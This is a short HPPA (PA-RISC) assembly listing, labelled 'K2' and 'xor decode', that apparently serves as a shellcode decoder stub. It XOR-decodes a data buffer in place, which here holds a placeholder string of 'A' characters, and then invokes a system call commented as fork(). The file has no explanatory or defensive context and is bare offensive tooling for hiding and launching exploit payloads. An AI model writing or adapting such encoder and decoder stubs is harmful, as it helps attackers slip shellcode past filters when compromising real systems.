; K2,
; HPPA xor decode
; uses: r31,r19,r20,r21,r22,r23,r1

        .SPACE  $TEXT$
main
        ldil    L'0xFFFFFFFF,%r19		; decode key
        ldo     R'0xFFFFFFFF(%r19),%r19
        bl      over,%r31
over    
        ldil    L'str,%r20
        ldo     R'str(%r20),%r20

        ldi     -0x30,%r21
loop    ldw     0(%r20),%r22
        xor     %r19,%r22,%r23
        stw     %r23,0(%r20)
        addi    0x4,%r20,%r20
        cmpb,<> %r21,%r0,loop
        addi    4,%r21,%r21

        xor     %r22,%r22,%r22			; fork(); 
        ldil L'0xC0000004,%r1
        ble R'0xC0000004(%sr7,%r1)
        addi,OD 0x2,%r22,%r22

        .EXPORT main,ENTRY
.data
str     .string "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
